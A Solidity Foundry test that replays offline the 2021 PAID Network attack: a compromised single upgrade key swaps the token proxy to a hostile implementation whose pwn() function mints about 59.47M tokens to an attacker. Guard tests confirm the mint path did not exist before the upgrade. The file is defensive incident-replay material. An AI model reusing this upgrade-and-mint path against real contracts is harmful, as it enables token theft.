// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {
    PaidTokenProxy,
    BenignPaidLogic,
    MaliciousPaidLogic
} from "../fixtures/upgrade-governance/b-incident/PaidUpgradeClone.sol";

interface IPaidToken {
    function owner() external view returns (address);
    function implementation() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function upgradeTo(address) external;
}

interface IPaidTransfer {
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPaidPwn {
    function pwn(address to, uint256 amount) external;
}

/// @title upgrade-governance (b) real-incident fixture: PAID Network (2021-03-05).
/// @notice Minimized OFFLINE replay of the documented attack path (no live RPC): PAID's ERC-20
///         was an upgradeable (proxy) token whose implementation could be swapped by a SINGLE
///         key (the original deployer's). That key was compromised; the attacker swapped in an
///         implementation absent from the audited code that could mint, then minted ~59.47M
///         PAID to themselves and sold into the market. The audited code was clean - the defect
///         was the unguarded single-key upgrade (no timelock/guardian/multisig). This test
///         replays: instant single-key `upgradeTo(hostile)` -> the hostile implementation mints
///         to the attacker. The verdict is derived from the real OUTCOME (attacker balance /
///         total supply moved by the post-upgrade mint), not from addresses. Provenance (PAID
///         token contract, figures, post-mortems) in PROVENANCE.md. label=vuln -> VULNERABLE.
contract PaidUpgradeIncidentTest is Test {
    // The real attacker address is only partially public (SlowMist: begins 0x187..., ends
    // ...65be); it is NOT reproduced in full here - a synthetic placeholder is used instead,
    // so no address is fabricated. The vector and outcome are what matter, not the figure.
    address constant ATTACKER = address(0xA77ACC);
    address constant DEPLOYER_KEY = address(0xDEADBEEF); // the single compromised upgrade key
    address constant TREASURY = address(0x7EA50); // a representative pre-attack holder

    // Documented figures (see PROVENANCE.md). 18 decimals.
    uint256 constant INITIAL_SUPPLY = 594_717_455e18; // reported PAID total supply pre-attack
    uint256 constant MINTED = 59_471_745_571 * 1e15; // = 59,471,745.571 PAID minted by the attacker

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat("[upgrade-governance] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED")
        );
    }

    function _deploy() internal returns (PaidTokenProxy proxy) {
        BenignPaidLogic benign = new BenignPaidLogic();
        address[] memory holders = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        holders[0] = TREASURY;
        amounts[0] = INITIAL_SUPPLY;
        proxy = new PaidTokenProxy(DEPLOYER_KEY, address(benign), holders, amounts);
    }

    /// Vulnerable target: a single compromised upgrade key swaps in a mint-capable
    /// implementation INSTANTLY and mints the documented supply to the attacker.
    function test_vulnerable_singleKeyUpgradeMintsToAttacker() public {
        PaidTokenProxy proxy = _deploy();
        IPaidToken token = IPaidToken(address(proxy));
        MaliciousPaidLogic evil = new MaliciousPaidLogic();

        // The live, audited token behaves normally and has no arbitrary-mint path.
        assertEq(token.balanceOf(ATTACKER), 0, "attacker starts with nothing");
        assertEq(token.totalSupply(), INITIAL_SUPPLY, "pre-attack supply");

        // Compromised single key swaps in the hostile implementation - instant, no gate.
        vm.prank(DEPLOYER_KEY);
        token.upgradeTo(address(evil));

        // The hostile implementation mints the documented supply to the attacker.
        vm.prank(ATTACKER);
        IPaidPwn(address(proxy)).pwn(ATTACKER, MINTED);

        bool drained = (token.balanceOf(ATTACKER) == MINTED && token.totalSupply() == INITIAL_SUPPLY + MINTED);
        _report("paid-upgrade-victim", drained);

        assertTrue(drained, "single-key upgrade should enable the unauthorized mint");
        assertEq(token.balanceOf(ATTACKER), MINTED, "attacker holds the minted supply");
        assertEq(token.totalSupply(), INITIAL_SUPPLY + MINTED, "supply inflated by the mint");
        assertEq(token.implementation(), address(evil), "hostile implementation is active");
    }

    /// Guard: the mint path did NOT exist in the audited implementation - before the upgrade
    /// the same call reverts and nothing is minted. This proves the drain is enabled by the
    /// unguarded upgrade, not by a pre-existing mint bug.
    function test_guard_noMintPathBeforeUpgrade() public {
        PaidTokenProxy proxy = _deploy();
        IPaidToken token = IPaidToken(address(proxy));

        vm.prank(ATTACKER);
        vm.expectRevert(); // benign implementation has no pwn(); the delegatecall reverts
        IPaidPwn(address(proxy)).pwn(ATTACKER, MINTED);

        assertEq(token.balanceOf(ATTACKER), 0, "nothing minted before the hostile upgrade");
        assertEq(token.totalSupply(), INITIAL_SUPPLY, "supply unchanged before the hostile upgrade");
    }

    /// Guard: the audited token is a real, working ERC-20 pre-attack (a plain transfer
    /// settles), so the incident is a hostile upgrade - not a dead contract.
    function test_guard_auditedTokenTransfersNormally() public {
        PaidTokenProxy proxy = _deploy();
        IPaidToken token = IPaidToken(address(proxy));

        vm.prank(TREASURY);
        IPaidTransfer(address(proxy)).transfer(ATTACKER, 1_000e18);

        assertEq(token.balanceOf(ATTACKER), 1_000e18, "normal transfer works pre-attack");
        assertEq(token.totalSupply(), INITIAL_SUPPLY, "a transfer does not change supply");
    }
}
